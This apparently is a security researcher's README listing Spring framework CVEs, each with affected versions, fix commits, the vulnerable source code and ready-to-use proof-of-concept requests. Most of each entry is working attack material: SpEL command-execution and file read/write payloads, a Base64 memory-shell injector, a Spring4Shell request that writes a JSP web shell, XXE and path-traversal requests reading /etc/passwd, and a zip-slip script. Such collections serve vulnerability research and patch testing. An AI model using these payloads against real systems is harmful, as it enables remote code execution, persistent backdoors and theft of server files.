# SpringSecurity
A list for Spring Security

| Spring Projects | CVE | Vulnerability Types |
|:---:|:---:|:---:|
| Spring Cloud Function | CVE-2020-22979 | DoS |
| Spring Cloud Function | CVE-2022-22963 | SpEL |
| Spring Cloud Netflix Hystrix Dashboard | CVE-2021-22053 | SpEL |
| Spring Cloud Netflix Hystrix Dashboard | CVE-2020-5412 | SSRF |
| Spring Cloud Gateway | CVE-2022-22947 | RCE |
| Spring Cloud Config | CVE-2019-3799 | Directory Traversal |
| Spring Cloud Config | CVE-2020-5405 | Directory Traversal |
| Spring Cloud Config | CVE-2020-5410 | Directory Traversal |
| Spring Data Commons | CVE-2018-1259 | XXE |
| Spring Data Commons | CVE-2018-1273 | SpEL |
| Spring Data Rest | CVE-2017-8046 | SpEL |
| Spring Security| CVE-2022-22978 | Authorization Bypass |
| Spring Security| CVE-2022-31692 | Authorization Bypass |
| Spring Security| CVE-2023-34034 | Authorization Bypass |
| Spring Security OAuth2 | CVE-2016-4977 | SpEL |
| Spring Security OAuth2 | CVE-2018-1260 | SpEL |
| Spring Boot Actuator Logview | CVE-2021-21234 | Directory Traversal |
| Spring Framework | CVE-2018-1270 | RCE |
| Spring Framework | CVE-2020-5398 | Reflected File Download |
| Spring Framework | CVE-2020-5421 | Reflected File Download |
| Spring Framework | CVE-2022-22965 | RCE |
| Spring Framework | CVE-2013-4152 | XXE |
| Spring Framework | SpringConfigTest | RCE |
| Spring Framework | CVE-2023-20860 | Authorization Bypass |
| Spring Integration Zip | CVE-2018-1261 | Arbitrary File Write |

## Programming Environment Setup
Spring Security Advisories: https://spring.io/security/

SpringBoot: https://start.spring.io/

Spring Projects Examples: https://github.com/spring-projects

Spring Extension Examples: https://github.com/spring-guides

Sring Cloud correspond to Springboot versions: https://spring.io/projects/spring-cloud
```
    <properties>
        <java.version>1.8</java.version>
<!--        <spring-cloud.version>2021.0.3</spring-cloud.version>-->
        <spring-cloud.version>Hoxton.SR3</spring-cloud.version>
    </properties>
```

## Some Problems in Spring Config
Spring OXM —— XStreamMarshaller —— XStream RCE

Hibernate-Validator —— @Valid + buildConstraintViolationWithTemplate —— EL RCE

Http-Invoker —— HttpInvokerServiceExporter —— Deserialization RCE

Ref: https://github.com/ax1sX/SpringSecurity/tree/main/SpringConfigTest

## Vulnerabilities
### （1）Spring Cloud Function
#### CVE-2022-22979 DoS
Affected Version: < 3.2.6

Ref: https://checkmarx.com/blog/spring-function-cloud-dos-cve-2022-22979-and-unintended-function-invocation/

POC: 
```
POST /uppercase, HTTP/1.1

{'a':1}
```
Factor: 
```
BeanFactoryAwareFunctionRegistry
public <T> T lookup(Class<?> type, String functionDefinition, String... expectedOutputMimeTypes) {
    functionDefinition = StringUtils.hasText(functionDefinition) ? functionDefinition : this.applicationContext.getEnvironment().getProperty("spring.cloud.function.definition", ""); // get uri -> "uppercase,"
    functionDefinition = this.normalizeFunctionDefinition(functionDefinition); // Replace , with |, -> "uppercase|"
    ...
    FunctionInvocationWrapper function = (FunctionInvocationWrapper)this.doLookup(type, functionDefinition, expectedOutputMimeTypes);// (1)function=wrappedFunctionDefinitions.get(functionDefinition); (2)if(function==null){"uppercase|" -> ["uppercase", ""]，遍历数组从Function注册表中寻找对应值，找到了就将Function存放于wrappedFunctionDefinitions，没找到就返回空}
    if (function == null) {
      ...
      this.register(functionRegistration);// SimpleFunctionRegistry.register
    }
}

SimpleFunctionRegistry
public <T> void register(FunctionRegistration<T> registration) {
    this.functionRegistrations.add(registration); //将funtion注册在funtionRegistrations中，它是CopyOnWriteArraySet类型，随着size无限增大造成DoS
}
```
#### CVE-2022-22963 SpEL
Affected Version: <= 3.1.6, 3.2.2

POC: 
```
POST /functionRouter HTTP/1.1
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("open -a Calculator")

aaa
```
Factor: 
```
RoutingFunction
private Object route(Object input, boolean originalInputIsPublisher) {
    Function function;
    if (input instanceof Message) {
        if (StringUtils.hasText((String)message.getHeaders().get("spring.cloud.function.definition"))) {...}
        else if (StringUtils.hasText((String)message.getHeaders().get("spring.cloud.function.routing-expression"))) {
            function = this.functionFromExpression((String)message.getHeaders().get("spring.cloud.function.routing-expression"), message);
            ...
        }...
}

private final StandardEvaluationContext evalContext = new StandardEvaluationContext();

private Function functionFromExpression(String routingExpression, Object input) {
    Expression expression = this.spelParser.parseExpression(routingExpression);
    String functionName = (String)expression.getValue(this.evalContext, input, String.class);
    ...
}
```
SpEL POC:  
```
// Command Execution
T(Runtime).getRuntime().exec(\"open -a Calculator\")
new java.lang.ProcessBuilder({\"/bin/sh\",\"-c\",\"open -a Calculator\"}).start()
T(String).getClass().forName("java.lang.Runtime").getRuntime().exec("open -a Calculator")
T(String).getClass().forName("java.lang.Runtime").getMethod("exec",T(String[])).invoke(T(String).getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(T(String).getClass().forName("java.lang.Runtime")),new String[]{"/bin/sh","-c","open -a Calculator"})
T(javax.script.ScriptEngineManager).newInstance().getEngineByName("nashorn").eval("s=[3];s[0]='/bin/sh';s[1]='-c';s[2]='open -a Calculator';java.lang.Runtime.getRuntime().exec(s);")
T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName("JavaScript").eval("s=[3];s[0]='/bin/sh';s[1]='-c';s[2]='open -a Calculator';java.lang.Runtime.getRuntime().exec(s);"),)
nstance().getEngineByName("JavaScript").eval(T(java.net.URLDecoder).decode("%6a...")),)

// Command Execution + Response
new java.io.BufferedReader(new java.io.InputStreamReader(new ProcessBuilder("/bin/sh", "-c", "whoami").start().getInputStream(), "gbk")).readLine()
new java.util.Scanner(new java.lang.ProcessBuilder("/bin/sh", "-c", "ls", ".\\").start().getInputStream(), "GBK").useDelimiter("asdfasdf").next()

// Read or Write File
new String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get(T(java.net.URI).create("file:/Users/axisx/Downloads/application.properties"))))
T(java.nio.file.Files).write(T(java.nio.file.Paths).get(T(java.net.URI).create("file:/C:/Users/1.txt")), 'hello'.getBytes(), T(java.nio.file.StandardOpenOption).WRITE)

// MemShell
#{T(org.springframework.cglib.core.ReflectUtils).defineClass('Memshell',T(org.springframework.util.Base64Utils).decodeFromString('yv66vgAAA....'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject()}
```

### （2）Spring Cloud Gateway
#### CVE-2022-22947 RCE
Affected Version: < 3.1.1 or < 3.0.7

Ref: 

https://wya.pl/2022/02/26/cve-2022-22947-spel-casting-and-evil-beans/

https://wya.pl/2021/12/20/bring-your-own-ssrf-the-gateway-actuator/  

Diff: https://github.com/spring-cloud/spring-cloud-gateway/commit/337cef276bfd8c59fb421bfe7377a9e19c68fe1e

POC1(Command Execution): 
```
POST /actuator/gateway/routes/new_route HTTP/1.1
Host: 127.0.0.1:9000
Connection: close
Content-Type: application/json

{
  "predicates": [
    {
      "name": "Path",
      "args": {
        "_genkey_0": "/new_route/**"
      }
    }
  ],
  "filters": [
    {
      "name": "RewritePath",
      "args": {
        "_genkey_0": "#{T(java.lang.Runtime).getRuntime().exec(\"open -a Calculator\")}",
        "_genkey_1": "/${path}"
      }
    }
  ],
  "uri": "https://wya.pl",
  "order": 0
}
```
```
POST /actuator/gateway/refresh HTTP/1.1
Host: 127.0.0.1:9000
Content-Type: application/json
Connection: close
Content-Length: 258
```
POC2(Command Execution + Response):
```
POST /actuator/gateway/routes/hacktest HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 329

{
  "id": "hacktest",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
    }
  }],
  "uri": "http://example.com"
}
```
```
POST /actuator/gateway/refresh HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```
```
GET /actuator/gateway/routes/hacktest HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```
Factor: 
```
ShortcutConfigurable
static Object getValue(SpelExpressionParser parser, BeanFactory beanFactory, String entryValue) {
    String rawValue = entryValue;
    if (entryValue != null) {
        rawValue = entryValue.trim();
    }

    Object value;
    if (rawValue != null && rawValue.startsWith("#{") && entryValue.endsWith("}")) {
        StandardEvaluationContext context = new StandardEvaluationContext();
        context.setBeanResolver(new BeanFactoryResolver(beanFactory));
        Expression expression = parser.parseExpression(entryValue, new TemplateParserContext());
        value = expression.getValue(context);
    } else {
        value = entryValue;
    }

    return value;
}
```
### （3）Spring Data Commons
#### CVE-2018-1259 XXE
Affected Version: < 1.13.12 or < 2.0.7 + XMLBeam <= 1.4.14

Diff: https://github.com/SvenEwald/xmlbeam/commit/f8e943f44961c14cf1316deb56280f7878702ee1

POC:
```
POST / HTTP/1.1
Content-Type: application/xml;charset=UTF-8

<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<user>
	<firstname>&xxe;</firstname>
	<lastname>axisx</lastname>
</user>
```
Factor: 
```
org.xmlbeam.io.StreamInput
private Document readDocument() throws IOException {
    try {
        DocumentBuilder documentBuilder = this.projector.config().createDocumentBuilder();
        Document document = this.systemID == null ? documentBuilder.parse(this.is) : documentBuilder.parse(this.is, this.systemID);
        return document;
    } ...
}
```

#### CVE-2018-1273 SpEL
Affected Version: < 1.13.11 or < 2.0.6

Diff: https://github.com/spring-projects/spring-data-commons/commit/b1a20ae1e82a63f99b3afc6f2aaedb3bf4dc432a

POC: 
```
POST /users?page=&size=5 HTTP/1.1

username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("open -a Calculator")]=&password=&repeatedPassword=

// other pocs
username[#this.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec('open -a Calculator')")]=&password=&repeatedPassword=
username[(#root.getClass().forName("java.lang.ProcessBuilder").getConstructor('foo'.split('').getClass()).newInstance('shxx-cxxopen -a Calculator'.split('xx'))).start()]=&password=&repeatedPassword=
```
Factor: 
```
MapDataBinder
public void setPropertyValue(String propertyName, @Nullable Object value) throws BeansException {
    if (!this.isWritableProperty(propertyName)) {
        throw new NotWritablePropertyException(this.type, propertyName);
    } else {
        StandardEvaluationContext context = new StandardEvaluationContext();
        ...
        Expression expression = PARSER.parseExpression(propertyName);
        ...
        try {
            expression.setValue(context, value);
        } ...
    }
}
```
### （4）Spring Data Rest
#### CVE-2017-8046 SpEL
Affected Version: < 2.5.12 or 2.6.7 or 3.0 RC3

Diff: https://github.com/spring-projects/spring-data-rest/commit/8f269e28fe8038a6c60f31a1c36cfda04795ab45

POC: 
```
// Create User
POST /people HTTP/1.1
Content-Type:application/json

{"firstName":"san","lastName":"zhang"}

// Patch, modify user info
PATCH /people/1 HTTP/1.1
Content-Type:application/json-patch+json

[{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72}))/lastName", "value": "hacker" }]
```
Factor: 
```
PatchOperation
protected void setValueOnTarget(Object target, Object value) {
    this.spelExpression.setValue(target, value);
}
```
### （5）Spring Security

#### CVE-2022-22978 Authorization Bypass
Affected Version: < 5.5.6, 5.6.3, earlier

Official description: 

> Applications using RegexRequestMatcher with `.` in the regular expression are possibly vulnerable to an authorization bypass

Diff: https://github.com/spring-projects/spring-security/commit/70863952aeb9733499027714d38821db05654856

POC: (`\r` -> `%0d`, `\n` -> `%0a`)
```
/admin/axisx%0a
/admin/axisx%0a%0d
```
Factor: 
```java
// RegexRequestMatcher
public boolean matches(HttpServletRequest request) {
    String url = request.getServletPath();
    String pathInfo = request.getPathInfo();
    String query = request.getQueryString();
    ...
    return this.pattern.matcher(url).matches();  // regexMatchers("/admin/.*")
}

request.getRequestURL(): http://ip:port/admin/axisx%0a%0d
request.getRequestURI(): /admin/axisx%0a%0d
request.getContextPath(): /Project Name/ or ""
request.getServletPath(): /admin/axisx\n\r
request.getPathInfo()：/Servlet Path/ or Null
```
Summary: `.` in regular matches do not handle `\n`,`\r`

#### CVE-2022-31692 Authorization Bypass
Affected Version: 5.7 to 5.7.5, 5.6 to 5.6.9 

Ref: https://spring.io/security/cve-2022-31692/

#### CVE-2023-34034 Authorization Bypass
Affected Version: 6.1.0 to 6.1.1, 6.0.0 to 6.0.4, 5.8.0 to 5.8.4, 5.7.0 to 5.7.9, 5.6.0 to 5.6.11

Official description: 

> Using "**" as a pattern in Spring Security configuration for WebFlux creates a mismatch in pattern matching between Spring Security and Spring WebFlux, and the potential for a security bypass.


#### CVE-2016-4977 OAuth2 SpEL
Affected Version: < 2.0.0-2.0.9 or 1.0.0-1.0.5

Diff: https://github.com/spring-attic/spring-security-oauth/commit/fff77d3fea477b566bcacfbfc95f85821a2bdc2d

POC: 
```
GET /oauth/authorize?response_type=token&client_id=acme&redirect_uri={payload}

${T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72}))}
```
Factor: 
```
SpelView
    public SpelView(String template) {
        ...
        this.resolver = new PlaceholderResolver() {
            public String resolvePlaceholder(String name) {
                Expression expression = SpelView.this.parser.parseExpression(name);
                Object value = expression.getValue(SpelView.this.context);
                return value == null ? null : value.toString();
            }
        };
    }
```

#### CVE-2018-1260 OAuth2 SpEL
Affected Version: < 2.3.3 or 2.2.2 or 2.1.2 or 2.0.15

Ref: https://www.gosecure.net/blog/2018/05/17/beware-of-the-magic-spell-part-2-cve-2018-1260/

Diff: https://github.com/spring-attic/spring-security-oauth/commit/adb1e6d19c681f394c9513799b81b527b0cb007c

POC: (scope中如果存在空格，会被切分成数组)
```
GET or POST
/oauth/authorize?client_id=client&response_type=code&redirect_uri=http://www.baidu.com&scope=%24%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22calc.exe%22%29%7D
```
Factor: 
```
org.springframework.security.oauth2.provider.endpoin.SpelView
    public SpelView(String template) {
        ...
        this.resolver = new PlaceholderResolver() {
            public String resolvePlaceholder(String name) {
                Expression expression = SpelView.this.parser.parseExpression(name);
                Object value = expression.getValue(SpelView.this.context);
                return value == null ? null : value.toString();
            }
        };
    }
```

### （6）Spring Cloud Netflix Hystrix Dashboard 
#### CVE-2021-22053 SpEL
Affected Version: < 2.2.9.RELEASE + Spring Boot Thymeleaf

POC: 
```
GET /hystrix/;a=a/__${T (java.lang.Runtime).getRuntime().exec("open -a calculator")}__::.x/

/hystrix/;a=a/__$%7BT%20(java.lang.Runtime).getRuntime().exec(%22open%20-a%20calculator%22)%7D__::.x
/hystrix;/__$%7BT%20(java.lang.Runtime).getRuntime().exec(%22open%20-a%20calculator%22)%7D__::.x/
/hystrix/;/__$%7BT%20(java.lang.Runtime).getRuntime().exec(%22open%20-a%20calculator%22)%7D__::.x/
```
Factor: 
```
org.thymeleaf.spring5.view.ThymeleafView
protected void renderFragment(Set<String> markupSelectorsToRender, Map<String, ?> model, HttpServletRequest request, HttpServletResponse response) throws Exception {
    IStandardExpressionParser parser = StandardExpressions.getExpressionParser(configuration);
    FragmentExpression fragmentExpression;
    try {
        fragmentExpression = (FragmentExpression)parser.parseExpression(context, "~{" + viewTemplateName + "}");
    }
}
org.thymeleaf.standard.expression.StandardExpressionParser
static IStandardExpression parseExpression(IExpressionContext context, String input, boolean preprocess) {
    IEngineConfiguration configuration = context.getConfiguration();
    String preprocessedInput = preprocess ? StandardExpressionPreprocessor.preprocess(context, input) : input;
}
```

#### CVE-2020-5412 SSRF
Affected Version: <  2.2.4 or 2.1.6

Diff: https://github.com/spring-cloud/spring-cloud-netflix/commit/624bbc8b50f7b5b6a1addc62040e4f2587f24f1b

POC: 
```
GET /proxy.stream?origin=www.baidu.com
```
Factor: 
```
org.springframework.cloud.netflix.hystrix.dashboard.HystrixDashboardConfiguration
protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
    String origin = request.getParameter("origin");
    StringBuilder url = new StringBuilder();
    if (!origin.startsWith("http")) {
        url.append("http://");
    }
    url.append(origin);
    String proxyUrl = url.toString();
    try {
        httpget = new HttpGet(proxyUrl);
        HttpClient client = HystrixDashboardConfiguration.ProxyStreamServlet.ProxyConnectionManager.httpClient;
        HttpResponse httpResponse = client.execute(httpget);
    }
}
```

### （7）Spring Boot Actuator Logview
#### CVE-2021-21234 Directory Traversal 
Affected Version: < 0.2.13

POC: 
```
GET /manage/log/view?filename=/etc/passwd&base=../../../../../
```
Factor: 
```
eu.hinsch.spring.boot.actuator.logview.FileSystemFileProvider
public void streamContent(Path folder, String filename, OutputStream stream) throws IOException {
    IOUtils.copy(new FileInputStream(this.getFile(folder, filename)), stream);
}
```
### （8）Spring Framework
#### CVE-2018-1270 RCE
Affected Version: < 5.0.5 or 4.3.15

Diff: https://github.com/spring-projects/spring-framework/commit/e0de9126ed8cf25cf141d3e66420da94e350708a#

POC: 
```
app.js -> Add header
var header = {"selector":"T(java.lang.Runtime).getRuntime().exec('open /System/Applications/Calculator.app')"};

Connect -> use burp to modify packets
["SUBSCRIBE\nid:sub-0\ndestination:/topic/greetings\nselector:T(java.lang.Runtime).getRuntime().exec('open /System/Applications/Calculator.app')\n\n\u0000"]

send messages...
```
Factor: 
```
org.springframework.messaging.simp.broker.DefaultSubscriptionRegistry
private MultiValueMap<String, String> filterSubscriptions(MultiValueMap<String, String> allMatches, Message<?> message) {
    info = this.subscriptionRegistry.getSubscriptions(sessionId);
    sub = info.getSubscription(subId);
    Expression expression = sub.getSelectorExpression();
    context = new StandardEvaluationContext(message);
    if (Boolean.TRUE.equals(expression.getValue(context, Boolean.class))) {
        result.add(sessionId, subId);
    }
}
```

#### CVE-2020-5398 Reflected File Download
Affected Version: < 5.2.3 or 5.1.13 or 5.0.16

Diff: hhttps://github.com/spring-projects/spring-framework/commit/956ffe68587c8d5f21135b5ce4650af0c2dea933

Ref: 

https://github.com/motikan2010/CVE-2020-5398

https://drive.google.com/file/d/0B0KLoHg_gR_XQnV4RVhlNl96MHM/view?resourcekey=0-NV7cTUTB48bltMEddlULLg

POC: 
```
curl 'http://127.0.0.1:8080/?filename=sample&contents=Hello,%20World' --dump-header -
curl 'http://127.0.0.1:8080/?filename=sample.sh%22%3B&contents=%23!%2Fbin%2Fbash%0Aid' --dump-header -
curl 'http://127.0.0.1:8080/?filename=sample.sh%22%3B&contents=%23!%2Fbin%2Fbash%0Aid' --dump-header -
```
Factor: 
```
@RequestMapping(value = {"/"}, method = RequestMethod.GET)
public ResponseEntity<String> download(@RequestParam("filename") String fileName, @RequestParam("contents") String contents) {

// Make file name in response header
ContentDisposition contentDisposition = ContentDisposition.builder("attachment")
	.filename(fileName + ".txt") // Secure .txt file
	.build();
HttpHeaders headers = new HttpHeaders();
headers.setContentDisposition(contentDisposition);

// Download contents
return ResponseEntity.ok()
	.headers(headers)
	.contentType(MediaType.parseMediaType("application/octet-stream"))
	.body(contents);
}

package org.springframework.http;
public final class ContentDisposition {
if (this.filename != null) {
    if (this.charset != null && !StandardCharsets.US_ASCII.equals(this.charset)) {
	sb.append("; filename*=");
	sb.append(encodeFilename(this.filename, this.charset));
    } else {
	sb.append("; filename=\""); 
	sb.append(this.filename).append('"');  //filename -> "sample.sh";.txt"
    }
}
```

#### CVE-2020-5421 Reflected File Download
Affected Version: < 5.2.8 or 5.1.17 or 5.0.18 or 4.3.28 Bypass CVE-2015-5211

Diff: https://github.com/spring-projects/spring-framework/commit/2281e421915627792a88acb64d0fea51ad138092

POC: 
```
GET /rfd/content?content=hello
GET /rfd/;jsessionid=/content.sh?content=%23!%2Fbin%2Fbash%0Aid
GET /rfd/;jsessionid=/content.bat?content=calc
```
Factor: 
```
org.springframework.web.servlet.mvc.method.annotation.AbstractMessageConverterMethodProcessor
private static final Set<String> WHITELISTED_EXTENSIONS = new HashSet(Arrays.asList("txt", "text", "yml", "properties", "csv", "json", "xml", "atom", "rss", "png", "jpe", "jpeg", "jpg", "gif", "wbmp", "bmp")); //允许的safeExtension
private static final Set<String> WHITELISTED_MEDIA_BASE_TYPES = new HashSet(Arrays.asList("audio", "image", "video")); 

private void addContentDispositionHeader(ServletServerHttpRequest request, ServletServerHttpResponse response) {
    String requestUri = rawUrlPathHelper.getOriginatingRequestUri(servletRequest);  // -> removeJsessionid绕过后续safeExtension校验
    filename = decodingUrlPathHelper.decodeRequestString(servletRequest, filename);
    String ext = StringUtils.getFilenameExtension(filename);
    pathParams = decodingUrlPathHelper.decodeRequestString(servletRequest, pathParams);
    String extInPathParams = StringUtils.getFilenameExtension(pathParams);
    if (!this.safeExtension(servletRequest, ext) || !this.safeExtension(servletRequest, extInPathParams)) {
	headers.add("Content-Disposition", "inline;filename=f.txt");
    }
}

org.springframework.web.util.UrlPathHelper
private String removeJsessionid(String requestUri) {
    int startIndex = requestUri.toLowerCase().indexOf(";jsessionid=");
    if (startIndex != -1) {
        int endIndex = requestUri.indexOf(59, startIndex + 12);
        String start = requestUri.substring(0, startIndex);
        requestUri = endIndex != -1 ? start + requestUri.substring(endIndex) : start;
    }
    return requestUri;
}
```

#### CVE-2013-4152
Affected Version: Spring Framework before 3.2.4 and 4.0.0.M1 using the JAXB marshaller

POC:
```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE test [
        <!ELEMENT test ANY>
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
<Order><id>&xxe;</id></Order>
```


#### CVE-2022-22965
Affected Version: 5.3.0 to 5.3.17, 5.2.0 to 5.2.19, and older versions

Ref: https://www.jianshu.com/p/e0c7a03e40d2

POC:
```
POST /SpringRCEDemo_war_exploded/hello?name=admin&age=2&Class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7bcmd%7di&Class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&Class.module.classLoader.resources.context.parent.pipeline.first.directory=/webapp/&Class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell1&Class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= HTTP/1.1

cmd: <%=Runtime.getRuntime().exec(request.getParameter("cmd"))%>
```

#### CVE-2023-20860
Affected Version: 6.0.0 <= x <= 6.0.6, 5.3.0 <= x <= 5.3.25, Versions older than 5.3 are not affected

Official description: 

> Using "**" as a pattern in Spring Security configuration with the mvcRequestMatcher creates a mismatch in pattern matching between Spring Security and Spring MVC, and the potential for a security bypass.

Diff: https://github.com/spring-projects/spring-framework/commit/202fa5cdb3a3d0cfe6967e85fa167d978244f28a

### （9）Spring Integration Zip
#### CVE-2018-1261 Arbitrary File Write
Affected Version: < 1.0.1

Diff: https://github.com/spring-projects/spring-integration-extensions/commit/d10f537283d90eabd28af57ac97f860a3913bf9b#diff-990b7a04b25d4c5b7cb46f536ac149b0

POC:
```
import zipfile
 
if __name__ == "__main__":
    try:
        binary = b'this is a axisx test'
        zipFile = zipfile.ZipFile("./src/main/resources/test.zip", "a", zipfile.ZIP_DEFLATED)
        info = zipfile.ZipInfo("test.zip")
        zipFile.writestr("../../axisx.jsp", binary)
        zipFile.close()
    except IOError as e:
        raise e
	
ResourceLoader resourceLoader = new DefaultResourceLoader();
File path =  new File("./targetFolder/");
final Resource evilResource = resourceLoader.getResource("classpath:test.zip");
try{
	InputStream evilIS = evilResource.getInputStream();
	Message<InputStream> evilMessage = MessageBuilder.withPayload(evilIS).build();
	UnZipTransformer unZipTransformer = new UnZipTransformer();
	unZipTransformer.setWorkDirectory(path);
	unZipTransformer.afterPropertiesSet();
	unZipTransformer.transform(evilMessage);
}
```
Factor: 
```
protected Object doZipTransform(final Message<?> message) throws Exception {
    public void process(InputStream zipEntryInputStream, ZipEntry zipEntry) throws IOException {
        final String zipEntryName = zipEntry.getName();
						
	if (ZipResultType.FILE.equals(zipResultType)) {
		final File tempDir = new File(workDirectory, message.getHeaders().getId().toString());
		tempDir.mkdirs(); //NOSONAR false positive
		final File destinationFile = new File(tempDir, zipEntryName);

		if (zipEntry.isDirectory()) {
			destinationFile.mkdirs(); //NOSONAR false positive
		}
		else {
			SpringZipUtils.copy(zipEntryInputStream, destinationFile);
			uncompressedData.put(zipEntryName, destinationFile);
		}
	}
}
```

### （10）Spring Cloud Config
CVE-2019-3799、CVE-2020-5405、CVE-2020-5410类似，可复用同一环境，更改Spring Cloud Config版本即可

#### CVE-2019-3799 Directory Traversal
Affected Version: < 2.1.2 or 2.0.4 or 1.4.6

Diff: https://github.com/spring-cloud/spring-cloud-config/commit/3632fc6f64e567286c42c5a2f1b8142bfde505c2

POC:
```
GET /a/b/test/..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd
```
Conf:（远程）
```
info:
  component: Config Server
spring:
  application:
    name: configserver
  autoconfigure.exclude: org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfiguration
  jmx:
    default_domain: cloud.config.server
  cloud:
    config:
      server:
        git:
          uri: https://github.com/spring-cloud-samples/config-repo
          repos:
            - patterns: multi-repo-demo-*
              uri: https://github.com/spring-cloud-samples/config-repo
```
Factor: 
```
org.springframework.cloud.config.server.resource.ResourceController
@RequestMapping("/{name}/{profile}/{label}/**")
public String retrieve(...){
    String path = getFilePath(request, name, profile, label);  // -> decodeAndCleanUriString()
    return retrieve(name, profile, label, path, resolvePlaceholders); // -> findOne()
}
	
	
org.springframework.web.util.UrlPathHelper
private String decodeAndCleanUriString(HttpServletRequest request, String uri) {
    uri = this.removeSemicolonContent(uri);  //移除";"号
    uri = this.decodeRequestString(request, uri); //进行url解码
    uri = this.getSanitizedPath(uri);  //处理"//"
    return uri;
}

org.springframework.cloud.config.server.resource.GenericResourceRepository
public synchronized Resource findOne(String application, String profile, String label,String path) {
    String[] locations = this.service.getLocations(application, profile, label).getLocations();
    try {
	for (int i = locations.length; i-- > 0;) {
	String location = locations[i];  // location为远程git地址下载到本地的tmp目录地址
	for (String local : getProfilePaths(profile, path)) {
	    Resource file = this.resourceLoader.getResource(location).createRelative(local); // tmp目录地址和label后的内容拼接
	    if (file.exists() && file.isReadable()) {
		return file;
	    }
	}
    }
}
```
#### CVE-2020-5405 Directory Traversal
Affected Version: < 2.2.2 or 2.1.7

Diff: https://github.com/spring-cloud/spring-cloud-config/commit/651f458919c40ef9a5e93e7d76bf98575910fad0

POC:
```
GET /1/1/..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29etc/nfs.conf
```
Conf:（本地）
```
info:
  component: Config Server
spring:
  application:
    name: configserver
  autoconfigure.exclude: org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfiguration
  jmx:
    default_domain: cloud.config.server
  profiles:
    active: native
  cloud:
    config:
      server:
        native:
          search-locations:
            - file:///Users/xxx/Downloads/environment/Spring/spring-cloud-config-2.2.1.RELEASE_cve_2020_5405/spring-cloud-config-server/config
```
Factor:
```
org.springframework.cloud.config.server.resource.ResourceController
@RequestMapping("/{name}/{profile}/{label}/**")
public String retrieve(...){
    String path = getFilePath(request, name, profile, label);  // -> decodeAndCleanUriString()
    return retrieve(name, profile, label, path, resolvePlaceholders); // -> findOne()
}

synchronized String retrieve(ServletWebRequest request, String name, String profile, String label, String path, boolean resolvePlaceholders) throws IOException {
    name = resolveName(name);
    label = resolveLabel(label); // -> replace (_) -> /
    Resource resource = this.resourceRepository.findOne(name, profile, label, path);
    ...
}

private String resolveLabel(String label) {
    if (label != null && label.contains("(_)")) {
        label = label.replace("(_)", "/");
    }
    return label;
}
```

#### CVE-2020-5410 Directory Traversal
Affected Version: < 2.2.2 or 2.1.7

Diff: https://github.com/spring-cloud/spring-cloud-config/commit/1c01d11b74ca08d04e89d935f4cafe1bd0e57c3c

POC:
```
GET /..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23/222/11
```
Factor:
```
public Environment getEnvironment(String name, String profiles, String label, boolean includeOrigin) {
    name = Environment.normalize(name);
    label = Environment.normalize(label);
    Environment environment = this.repository.findOne(name, profiles, label, includeOrigin);
    ...
}
public static String normalize(String s) {
    return s != null && s.contains("(_)") ? s.replace("(_)", "/") : s;
}
```
Conf同CVE-2020-5405


